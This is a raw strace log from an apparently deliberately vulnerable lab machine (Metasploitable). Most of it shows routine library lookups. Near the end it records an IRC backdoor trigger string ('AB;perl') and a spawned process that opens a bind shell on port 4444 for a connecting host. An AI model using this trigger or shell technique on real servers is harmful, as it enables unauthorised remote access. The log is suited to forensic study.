12208 20:24:33.371076 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371089 stat64("/lib/i686/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371100 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371112 stat64("/lib/i686", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371123 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371135 stat64("/lib/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371147 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371159 stat64("/lib/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371170 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371182 stat64("/lib/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371193 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371205 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12208 20:24:33.371222 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371235 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371247 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371260 stat64("/usr/lib/tls/i686/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371272 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371285 stat64("/usr/lib/tls/i686/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371297 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371310 stat64("/usr/lib/tls/i686", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371321 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371334 stat64("/usr/lib/tls/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371346 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371365 stat64("/usr/lib/tls/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371377 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371390 stat64("/usr/lib/tls/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371401 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371413 stat64("/usr/lib/tls", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371425 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371438 stat64("/usr/lib/i686/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371450 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371462 stat64("/usr/lib/i686/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371474 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371487 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12208 20:24:33.371505 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371517 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12208 20:24:33.371534 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371547 stat64("/usr/lib/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371559 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371575 stat64("/usr/lib/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371586 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371598 stat64("/usr/lib/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371610 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371621 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
12208 20:24:33.371638 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371653 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371665 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371679 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371691 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371705 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371717 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371730 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371743 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371756 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371768 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371781 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371794 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371806 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371819 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371831 stat64("/lib/i486-linux-gnu/tls", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371843 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371863 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371876 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371890 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371902 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371915 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371927 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371941 stat64("/lib/i486-linux-gnu/i686", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371953 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371966 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371978 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371991 stat64("/lib/i486-linux-gnu/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372003 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372015 stat64("/lib/i486-linux-gnu/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372031 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372044 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12208 20:24:33.372061 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372076 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372089 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372102 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372115 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372129 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372142 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372155 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372168 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372182 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372195 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372208 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372220 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372234 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372246 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372259 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372271 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372285 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372298 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372312 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372324 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372338 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372341 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372341 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372342 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372352 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372365 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372378 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372390 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372404 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.372416 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.372432 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12208 20:24:33.372454 munmap(0xb7d0b000, 29913) = 0
12208 20:24:33.372476 open("/etc/ld.so.cache", O_RDONLY) = 6
12208 20:24:33.372489 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12208 20:24:33.372506 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d0b000
12208 20:24:33.372517 close(6)          = 0
12208 20:24:33.372528 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12208 20:24:33.372543 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
12208 20:24:33.372558 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12208 20:24:33.372650 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12208 20:24:33.372674 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d00000
12208 20:24:33.372686 mmap2(0xb7d09000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d09000
12208 20:24:33.372704 close(6)          = 0
12208 20:24:33.372728 munmap(0xb7d0b000, 29913) = 0
12208 20:24:33.372753 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
12208 20:24:33.372772 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12208 20:24:33.372788 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
12208 20:24:33.372806 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d12000
12208 20:24:33.372817 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
12208 20:24:33.373008 close(6)          = 0
12208 20:24:33.373019 munmap(0xb7d12000, 4096) = 0
12208 20:24:33.373037 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
12208 20:24:33.373052 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
12208 20:24:33.373068 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d12000
12208 20:24:33.373079 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
12208 20:24:33.373267 close(6)          = 0
12208 20:24:33.373277 munmap(0xb7d12000, 4096) = 0
12208 20:24:33.373307 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
12208 20:24:33.373330 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab648) = -1 EINVAL (Invalid argument)
12208 20:24:33.373345 _llseek(6, 0, 0xbfcab690, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12208 20:24:33.373357 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab648) = -1 EINVAL (Invalid argument)
12208 20:24:33.373368 _llseek(6, 0, 0xbfcab690, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12208 20:24:33.373378 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
12208 20:24:33.373433 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
12208 20:24:33.373471 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
12208 20:24:33.373497 listen(6, 5)      = 0
12208 20:24:33.373554 accept(6,  <unfinished ...>
12207 20:24:33.373828 exit_group(0)     = ?
12205 20:24:33.373908 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12207
12205 20:24:33.379289 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12205 20:24:33.379289 --- SIGCHLD (Child exited) @ 0 (0) ---
12205 20:24:33.379289 waitpid(-1, 0xbfa42db8, WNOHANG) = -1 ECHILD (No child processes)
12205 20:24:33.379289 sigreturn()       = ? (mask now [])
12205 20:24:33.379290 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12205 20:24:33.379290 exit_group(0)     = ?
4519  20:24:33.389953 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12205
4519  20:24:33.409313 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  20:24:33.409313 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  20:24:33.409313 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  20:24:33.409313 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  20:24:33.409313 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  20:24:33.409314 gettimeofday({1495671873, 409314}, NULL) = 0
4519  20:24:33.409314 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  20:24:33.409314 clock_gettime(CLOCK_MONOTONIC, {48683, 226323254}) = 0
4519  20:24:33.409314 recv(5, "", 8192, 0) = 0
4519  20:24:33.409315 getsockopt(5, SOL_SOCKET, SO_ERROR, [32], [4]) = 0
4519  20:24:33.409315 send(5, "ERROR :Closing Link: [10.0.2.4] (Broken pipe)\r\n", 47, 0) = -1 EPIPE (Broken pipe)
4519  20:24:33.409315 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  20:24:33.409341 close(5)          = 0
4519  20:24:33.409355 time(NULL)        = 1495671873
4519  20:24:33.409364 time(NULL)        = 1495671873
4519  20:24:33.409382 gettimeofday({1495671873, 409386}, NULL) = 0
4519  20:24:33.409394 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:24:33.409421 clock_gettime(CLOCK_MONOTONIC, {48683, 226434297}) = 0
4519  20:24:33.409432 gettimeofday({1495671873, 409435}, NULL) = 0
4519  20:24:33.409442 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
12208 20:24:33.479126 <... accept resumed> {sa_family=AF_INET, sin_port=htons(43583), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
12208 20:24:33.479126 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaa638) = -1 EINVAL (Invalid argument)
12208 20:24:33.479126 _llseek(8, 0, 0xbfcaa680, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12208 20:24:33.479127 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaa638) = -1 EINVAL (Invalid argument)
12208 20:24:33.479127 _llseek(8, 0, 0xbfcaa680, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12208 20:24:33.479127 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
12208 20:24:33.479127 close(6)          = 0
12208 20:24:33.479159 dup(8)            = 6
12208 20:24:33.479173 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab4d8) = -1 EINVAL (Invalid argument)
12208 20:24:33.479184 _llseek(6, 0, 0xbfcab520, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12208 20:24:33.479202 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
12208 20:24:33.479223 dup2(6, 1)        = 1
12208 20:24:33.479235 close(6)          = 0
12208 20:24:33.479246 fcntl64(1, F_SETFD, 0) = 0
12208 20:24:33.479257 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab4a8) = -1 EINVAL (Invalid argument)
